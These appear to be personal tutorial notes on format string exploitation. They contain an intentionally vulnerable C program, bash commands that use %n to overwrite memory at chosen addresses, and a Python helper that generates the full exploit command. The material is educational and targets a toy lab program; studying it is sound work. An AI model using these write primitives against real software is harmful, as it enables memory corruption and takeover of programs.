	We are going to use another file for this, `fmt_vuln2.c`

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
    char text[1024];
    static int test_val = -72;
    static int next_val = 0x11111111;
    if(argc < 2) {
        printf("Usage: %s <text to print>\n", argv[0]);
        exit(0);
    }

    strcpy(text, argv[1]);
    printf("The right way to print user-controlled input:\n");
    printf("%s", text);
    printf("\nThe wrong way to print user-controlled input:\n");
    printf(text);
    printf("\n");
    
    // Debug output
    printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, test_val);
    printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &next_val, next_val, next_val);
    exit(0);
}
```

The only difference is an added address we are going to be overwriting.

So first we want to set the address to: `0x0806abcd`. That means the first address is simple, we just do:

```bash
./fmt_vuln2 `printf "\x20\x90\x55\x56JUNK\x20\x90\x55\x57JUNK\x20\x90\x55\x58JUNK\x20\x90\x55\x59"`%x%x%8x%n
```

We get 

```bash
[*] test_val @ 0x08049794 = 52 0x00000034
```

meaning we need to add to the first value `cd = 205`:
`205 - 52 + 8 = 161`

If we use the usual technique described in [[Format string write address#Overwriting more]], then we can get a `0x000000cd`. That’s good but the next one is somewhat harder since we need to roll over an int. How do we do that?

Well, we have 205 rn, and to roll over to something beginning with `ab`, the easiest target is `1ab = 427`, meaning we have to roll over we need to add `222`.

An other method to calculate would be `256-205+0xab`

Here is some code to calculate everything I was talking about and give you an exploit command:

```python
from sys import argv, exit


if len(argv) != 3:
    print(f"Syntax: python3 {argv[0]} INITIAL_VALUE ADDRESS_TO_WRITE")
    print(
        'INITIAL_VALUE is calculated with: ./program `printf "\\x20\\x90\\x55\\x56"`%x%x%8x%n')
    exit(1)

added = 0

if (input("Was the 8 input mode used? [y|n] : ") == "y"):
    added = 8


initial_value = int(argv[1])
overall_length = 0
final_list = []


def find_right_num(number):
    """This calculates how many times do we need to use 256 for the number"""
    right_num = 256
    while True:
        if right_num > number:
            return right_num
        else:
            right_num += 256


def inc_hex(hex_num, inc):
    """Increments a hex number by x and returns it in the same format"""
    hex_num_int = int("0x" + hex_num, 16)
    return str(hex(hex_num_int + inc))[2:]


def part_to_int(hexnum):
    """Turns part of a hex number to an integer"""
    return int("0x" + hexnum, 16)


def calc_num(num, overall_length):
    """Responsible for calculating the right values for everything but the first number"""
    if num < overall_length or (num - overall_length) < 8:
        return find_right_num(overall_length) - overall_length + num
        print("not yet implemented")
        exit(1)
    else:
        # print(f"{num} - {overall_length}")
        return num - overall_length


def calc_first_num(num, initial_value):
    """Calculates the first number"""
    if num < initial_value:
        print("Not yet implemented.")  # TODO: I was lazy to test how this works for now
        exit(1)
    else:
        return num - initial_value + added


first_num = calc_first_num(
    part_to_int(argv[2][-2] + argv[2][-1]), initial_value)  # gets the first hex part
print(f"1: {first_num}")
final_list.append(first_num)
overall_length = part_to_int(argv[2][-2] + argv[2][-1])


for x in range(1, 4):
    num = part_to_int(
        argv[2][-2 - x * 2] + argv[2][-1 - x * 2])  # gets the right characters from the back
    calculated_number = calc_num(num, overall_length)
    print(f"{x}: {calculated_number}")
    final_list.append(calculated_number)  # append to the list used at command gen
    overall_length += calculated_number  # add to the overall length.

if input("Want me to make you a command? [yes|no] : ") == "yes":
    program = input("Enter the program name: ")
    overwrite = input("Enter the address to overwrite: ")
    owl = []
    for x in range(4):
        adr_part = overwrite[-2 - x * 2] + overwrite[-1 - x * 2]
        owl.append(adr_part)

    first_address = f"\\x{inc_hex(owl[0], 0)}\\x{owl[1]}\\x{owl[2]}\\x{owl[3]}"
    second_address = f"\\x{inc_hex(owl[0], 1)}\\x{owl[1]}\\x{owl[2]}\\x{owl[3]}"
    third_address = f"\\x{inc_hex(owl[0], 2)}\\x{owl[1]}\\x{owl[2]}\\x{owl[3]}"
    fourth_address = f"\\x{inc_hex(owl[0], 3)}\\x{owl[1]}\\x{owl[2]}\\x{owl[3]}"

    first_part = f'`printf "{first_address}JUNK{second_address}JUNK{third_address}JUNK{fourth_address}"`'
    second_part = f"%x%x%{final_list[0]}x%n%{final_list[1]}x%n%{final_list[2]}x%n%{final_list[3]}x%n"
    command = f"{program} {first_part}{second_part}"
    print(command)

```

This is what a final command might look like:
```bash
./fmt_vuln2 `printf "\xf4\x97\x04\x08JUNK\xf5\x97\x04\x08JUNK\xf6\x97\x04\x08JUNK\xf7\x97\x04\x08"`%x%x%161x%n%222x%n%91x%n%258x%n
```

At the calculation we have to pay attention to rolling over numbers.

```ad-important
You can't really set a width lower than 8 characters so roll over if that would be the case.
```

```ad-info
We can use Direct Parameter Access to simplify everything, then we don't have to use "JUNK" and things like that. The syntax is:

`%n$d` this for example prints out the 'n'th decimal.
```

```ad-important
In bash you have to use the backwards slash for `$` signs
```

```ad-info
You can also use `%hn` to write double bytes, meaning you have to do half the work in that aspect.
```

